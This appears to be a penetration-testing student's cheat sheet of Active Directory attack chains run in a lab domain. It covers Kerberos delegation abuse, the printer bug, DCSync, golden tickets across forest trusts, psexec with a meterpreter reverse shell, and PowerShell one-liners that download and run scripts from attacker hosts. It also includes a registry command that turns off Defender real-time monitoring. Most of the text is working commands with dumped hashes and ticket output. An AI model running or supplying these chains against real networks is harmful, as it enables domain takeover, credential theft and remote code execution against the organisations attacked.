# scenario: abuse unconstrained delegation on APPSRV01
1. use admin creds to get machine creds
2. use machine creds to create a malicious SPN
3. add a DNS record for SPN
4. start a TGT listener on kali
5. force DC to connect to our SPN using the SpoolService bug
6. capture TGT to file for future phase of attack

# use admin creds to get machine creds of server with unconstrained delegation; note down the NTLM hash and the aesKey
impacket-secretsdump <user>:<pass>@<unconstrained_delegation_server_ip>
impacket-secretsdump offsec:lab@192.168.178.75
... (aesKey)
PROD\APPSRV01$:aes256-cts-hmac-sha1-96:e7b9ad06f6769c1fb7c3e1a84866523fa4bdeb4d28dfd636d742ce3d8cccb209
... (NTLM)
PROD\APPSRV01$:aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8:::

# use machine creds to create a malicious SPN
# see server's existing SPNs
python3 addspn.py -u <machine_user> -p <machine_ntlm_hash> -q <dc_fqdn>
python3 addspn.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -q CDC01.prod.corp1.com
# add our malicious SPN
python3 addspn.py -u <machine_user> -p <machine_ntlm_hash> -s <malicious_SPN> -q <dc_fqdn>
python3 addspn.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -s HOST/kali.prod.corp1.com CDC01.prod.corp1.com
# if it doesn't work add '--additional'
python3 addspn.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -s HOST/kali.prod.corp1.com CDC01.prod.corp1.com --additional
# verify that it has been added
python3 addspn.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -q CDC01.prod.corp1.com

# add a DNS record for SPN; first edit /etc/resolv.conf to use the DC dns server

sudo vim /etc/resolv.conf 
# comment out default records
search CDC01.prod.corp1.com
nameserver 192.168.178.70

# see if the DC DNS works by querying the address of our unconstrained delegation server fqdn
python3 dnstool.py -u <machine_user> -p <machine_ntlm_hash> -r <machine_fqdn> -a query <dc_fqdn>
python3 dnstool.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -r APPSRV01.prod.corp1.com -a query CDC01.prod.corp1.com
# add a DNS record for SPN
python3 dnstool.py -u <machine_user> -p <machine_ntlm_hash> -r <kali_spn_fqdn> -a add -d <kali_ip> <dc_fqdn>
python3 dnstool.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -r kali.prod.corp1.com -a add -d 192.168.45.206 CDC01.prod.corp1.com
# verify by querying the address of our kali fqdn
python3 dnstool.py -u PROD\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -r kali.prod.corp1.com -a query CDC01.prod.corp1.com

# revert /etc/resolv.conf before continuing

# start a TGT listener on kali; we need to stop smb service first it is running
sudo systemctl stop smbd nmbd
sudo python3 krbrelayx.py -aesKey <machine_aesKey>
sudo python3 krbrelayx.py -aesKey e7b9ad06f6769c1fb7c3e1a84866523fa4bdeb4d28dfd636d742ce3d8cccb209

# force DC to connect to our SPN using the SpoolService bug; in a seperate terminal
python3 printerbug.py -hashes <machine_ntlm_hash> <machine_user>@<dc_fqdn> <kali_spn_fqdn>
python3 printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 PROD/APPSRV01\$@CDC01.prod.corp1.com kali.prod.corp1.com

# back on krbrelayx.py
...
[*] Got ticket for CDC01$@PROD.CORP1.COM [krbtgt@PROD.CORP1.COM]
[*] Saving ticket in CDC01$@PROD.CORP1.COM_krbtgt@PROD.CORP1.COM.ccache
...

export KRB5CCNAME=/home/kali/osep/krbrelayx/'CDC01$@PROD.CORP1.COM_krbtgt@PROD.CORP1.COM.ccache'

# perform dcsnyc attack with secretsdump
impacket-secretsdump -k <dc_fqdn> -just-dc
impacket-secretsdump -k CDC01.prod.corp1.com -just-dc
```

```
# after performing DCSync attack with the krbtgt ticket we can use the hash of Administrator on the DC to psexec
impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com

alternatively: metasploit
sudo msfconsole
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.246
set RHOST 192.168.176.120
set LPORT 443
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e
exploit
```
## kerberos constrained delegation
```
# enumerate constrained delegation
# reference: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation
# scenario: as user 'offsec' on hostname 'client' we want to abuse constrained delegation to access mssql service

# with powerview we see IISSvc account has constrained delegation to MSSQL SPN
Get-DomainUser -TrustedToAuth | Format-Table samaccountname, msds-allowedtodelegateto, useraccountcontrol -Wrap
Get-DomainComputer -TrustedToAuth | Format-Table distinguishedname, msds-allowedtodelegateto, useraccountcontrol -Wrap
...
samaccountname           : IISSvc
msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS, MSSQLSvc/cdc01.prod.corp1.com:1433}
useraccountcontrol       : ..., TRUSTED_TO_AUTH_FOR_DELEGATION <-- indication of constrained delegation
...
```

```
# obtain creds (plaintext or hash) of user with TRUSTED_TO_AUTH_FOR_DELEGATION
# scenario specific: generate the NTLM hash from KNOWN plain text password for IISSvc user
. .\Invoke-Rubeus.ps1
Invoke-Rubeus -Command "hash /password:lab"

# use the result as the value for the rc4 parameter to get TGT
Invoke-Rubeus -Command "asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E"
...
[*] base64(ticket.kirbi):
      doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6A...
...
# S4U2Self and S4U2Proxy to get service ticket for mssql
Invoke-Rubeus -Command "s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt"
# alternatively: without needing to input TGT
Invoke-Rubeus -Command "s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt"

# continue attack chain on MSSQL
\\192.168.45.206\vscode\OSEP-Code-Snippets\MSSQL\bin\Release\MSSQL.exe

# if the same server has another service that isn't mssql we can exploit it with '/altservice:'
# doesn't work if SPN in msds-allowedtodelegateto ends with a port number eg. :1433
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
```

```
# example 2: constained delegation with rubeus.txt
$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[Rubeus.Program]::Main("purge".Split())
# use mimikatz to dump lsass then continue below
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:b8cdd27f8218f12b4a49b7e06db340b6 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
klist
```
## kerberos resource-based contrained delegation
```
# requires: computer/service account with an SPN in msDS-AllowedToActOnBehalfOfOtherIdentity of backend service account
# requires: GenericWrite access on a user to add SID of computer account to msDS-AllowedToActOnBehalfOfOtherIdentity of backend service
# scenario: as user 'dave' on hostname 'client' we want to abuse constrained delegation to access mssql service

# files needed on compromised machine:
- powerview.ps1
- powermad.ps1
- Invoke-Rubeus.ps1

# enumerate for GenericWrite
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, ActiveDirectoryRights -Wrap
...
ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : ..., GenericWrite
...
Identity              : PROD\dave
...
# in this scenario dave has GenericWrite on APPSRV01
# option 1: obtain the password hash of a computer account
# option 2: create a new computer account object with a selected password using PowerMad.ps1
# https://github.com/Kevin-Robertson/Powermad
# verify the number of new computer accounts that can be created and added to the domain 
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
# use PowerMad.ps1 to create new computer account
. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
# verify creation
Get-DomainComputer -Identity myComputer

# generate SID for computer account
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# as dave, assign SID of machine account to msDS-AllowedToActOnBehalfOfOtherIdentity on APPSRV01
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# verify
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
...
SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101
...
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101

# continue abuse constained delegation
. .\Invoke-Rubeus.ps1
Invoke-Rubeus -Command "hash /password:h4x"
Invoke-Rubeus -Command "s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt"
# verify and continue attack chain
klist
dir \\appsrv01.prod.corp1.com\c$
```

## kirbi ccache converter
```
# kirbi to ccache
msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.kirbi outputpath=ticket.ccache

# ccache to kirbi
msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.ccache outputpath=ticket.kirbi
```

## forest
```
# enumeration

# cmd
nltest /trusted_domains

# powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# powerview
Get-DomainTrust -API
Get-DomainTrust -Domain corp1.com
```

```
# extra SIDs

# enumerate: trust account is domain$ confirm with TRUST_ACCOUNT
# scenario: trust account is corp1$
# user must be domain admin; run powershell admin
powershell -ep bypass
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:corp1$"'
...
SAM Username         : CORP1$
Account Type         : 30000002 ( TRUST_ACCOUNT )
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
...
Credentials:
  Hash NTLM: 4b6af2bf64714682eeef64f516a08949
...

# force a replication of the password hash for the krbtgt account
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
...
Credentials:
  Hash NTLM: cce9d6cd94eb31ccfbb7cc8eeadf7ce1
...

# we will need the domain SID for both domains from PowerView
Get-DomainSID -Domain prod.corp1.com
S-1-5-21-634106289-3621871093-708134407
Get-DomainSID -Domain corp1.com
S-1-5-21-1587569303-1110564223-1586047116

# use static RID value 519 of the Enterprise Admins group to craft a golden ticket
kerberos::golden /user:<new_username> /domain:<your_domain> /sid:<sid_your_domain> /krbtgt:<NTLM_krbtgt_account> /sids:<sid_root_domain>-519 /ptt
Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-634106289-3621871093-708134407 /krbtgt:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:S-1-5-21-1587569303-1110564223-1586047116-519 /ptt"'

# validate with klist and move laterally onto root dc
c:\tools\SysinternalsSuite\PsExec.exe /accepteula \\rdc01 cmd

# confirm we are Enterprise Admin
whoami /groups
# continue attack chain
```

```
# using spoolsample
# scenario:
- compromised server with unconstrained delegation appsrv01
- compromised user with without domain admin priv offsec
# prerequisites:
- runas admin; powershell -ep bypass
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-SpoolSample.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Mimikatz2.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Rubeus.ps1")
# alternative use rubeus.txt
[Convert]::ToBase64String([IO.File]::ReadAllBytes("./Rubeus.exe")) | Out-File -Encoding ASCII rubeus.txt
$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
# alternatively: $content = (Invoke-WebRequest -Uri "http://192.168.45.197/rubeus.txt").Content
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))

# confirm we have access to the print spooler pipe
ls \\rdc01\pipe\spoolss

# start TGT listener
Invoke-Rubeus -Command "hash /password:lab"
[Rubeus.Program]::Main("hash /password:lab".Split())
Invoke-Rubeus -Command "monitor /interval:5 /filteruser:RDC01$ /nowrap"
[Rubeus.Program]::Main("monitor /interval:5 /filteruser:RDC01$ /nowrap".Split())
Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>/pipe/test'
Invoke-SpoolSample -Target 'rdc01.corp1.com' -CaptureServer 'appsrv01.prod.corp1.com'

# TGT listener should have captured RDC01$@CORP1.COM TGT
# remove all newlines characters from the base64 TGT in cyberchef 
Invoke-Rubeus -Command "ptt /ticket:<base64_TGT>"
[Rubeus.Program]::Main("ptt /ticket:<base64_TGT>".Split())
...
[+] Ticket successfully imported!

# rdc computer account cannot perform code execution but it can dump creds
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp1.com /user:corp1\administrator"'
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
sudo vim/etc/hosts is updated
impacket-psexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e administrator@rdc01.corp1.com
```

```
# enumerate other forest 

# enumerating from the perspective of user from the prod.corp1.com domain
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# with powerview
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/powerview.ps1")
Get-DomainTrust -Domain corp1.com
Get-DomainTrustMapping

# enumerate users on a different domain that is trusted
Get-DomainUser -Domain corp2.com
Get-DomainUser -Domain corp2.com | select samaccountname, distinguishedname

# possible attack vector: if two users with the same name exist on different domains then they MAY use the same password

# discover any groups inside our current forest that have members that originate from corp2.com
# scenario: user in prod.corp1.com may be a member of a group in corp2.com
Get-DomainForeignGroupMember -Domain corp2.com
...
GroupName               : myGroup2
...
MemberName              : S-1-5-21-3776646582-2086779273-4091361643-1601
...
convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
```

```
# extra SIDs in forest trusts

# in powershell as domain admin dcsync to get krbtgt hash
runas /user:corp1.com\Administrator powershell
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Mimikatz2.ps1")
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt"'
...
SAM Username         : krbtgt
...
Hash NTLM: 6b1bca4a1f7dbd67e28d3491290e4cb3
...

Get-DomainSID -domain corp1.com
S-1-5-21-1587569303-1110564223-1586047116
Get-DomainSID -domain corp2.com
S-1-5-21-3759240818-3619593844-2110795065

kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt

# be aware the golden ticket may not work due to SID filtering

# display the attributes of the trust object before enabling SID history
Get-DomainTrust -Domain corp2.com
...
TrustAttributes : FOREST_TRANSITIVE
...

# remote into the DC of corp2 and enable SID history
netdom trust <source_domain> /d:<target_domain> /enablesidhistory:yes
netdom trust corp2.com /d:corp1.com /enablesidhistory:no

Get-DomainTrust -Domain corp2.com
...
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
...

# regenerate golden ticket and try again
kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt

# this may still fail because SID suffix (RID) less than 1000 will still be filtered

# find custom group whose RID is > 1000
Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
...
MemberName              : powerGroup
...
MemberSID               : S-1-5-21-3759240818-3619593844-2110795065-1106

# notes:
- custom group cannot be a member global security group (Domain Admins or Enterprise Admins)
- only group membership in domain local security groups (Administrators) is not filtered

# regenerate golden ticket and try again
kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt
Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:6b1bca4a1f7dbd67e28d3491290e4cb3 /sids:S-1-5-21-3759240818-3619593844-2110795065-1106 /ptt"'

c:\tools\SysinternalsSuite\PsExec.exe -accepteula \\dc01.corp2.com cmd
```

```
# compromise forests via linked sql servers

# enumerate SPNs for mssql
setspn -T prod -Q MSSQLSvc/*
setspn -T corp1 -Q MSSQLSvc/*
setspn -T corp2.com -Q MSSQLSvc/*

```

# Combining the pieces

```
Enumeration with HostRecon
Check RunAsPPL to see if lsa is enabled
check application whitelisting
bypass amsi
check priv use custom printspoofer and use spoolsample
```

# mono setup

```
# add the mono repo for debian 11
sudo apt install monodevelop mono-complete nuget
```

## misc.

```
# compiling a solution for release
msbuild /p:TargetFrameworkVersion=3.5;Configuration=Release HelloWorld.sln

# mono .NET framework paths
/usr/lib/mono
```

# smb setup
```
sudo apt install samba
sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
sudo vim /etc/samba/smb.conf
```

```
[share]
 path = /home/kali/osep/
 browseable = yes
 read only = no
```

```
sudo smbpasswd -a kali
sudo systemctl start smbd nmbd

# ensure '/home/kali/osep/OSEP-Code-Snippets/' exists
chmod -R 777 /home/kali/osep
```

```
net use z: \\192.168.49.102\share /user:kali kali
net use \\192.168.49.102\share /user:kali kali
net use \\192.168.49.102\share
```

#  fileless powershell
```
see what powershell binary you want from this list:
https://github.com/S3cur3Th1sSh1t/PowerSharpPack
# make sure you bypass AMSI first
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.206/Invoke-SpoolSample.ps1")
Invoke-Spoolsample -Command "<YOUR_COMMAND_COES_HERE>"

# option 1:
powershell.exe -ExecutionPolicy Bypass -command “iex(New-Object Net.WebClient).DownloadString(‘http://attacker.home/myscript.ps1’)”

# option 2:
echo IEX (New-Object Net.WebClient).DownloadString('http://attacker.home/myscript.ps1') | powershell -NoProfile -Command -

# option 3:
powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://attacker.home/myscript.ps1").Content).Invoke();"
```

# compiled binaries
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries


```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

# run powershell as admin
```powershell
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = 'powershell.exe'
$psi.Arguments = '-NoProfile -NoExit -Command "& { Write-Host "Running as System" }"'
$psi.Verb = 'runas'
$psi.UseShellExecute = $true
$psi.RedirectStandardOutput = $false

$process = [System.Diagnostics.Process]::Start($psi)
```

# github tokens

```
Settings > Developer Tools > Access Tokens
git remote set-url origin https://thamyekh:github_pat_1...<REMAINDER_OF_TOKEN>@github.com/thamyekh/OSEP-Code-Snippets.git
```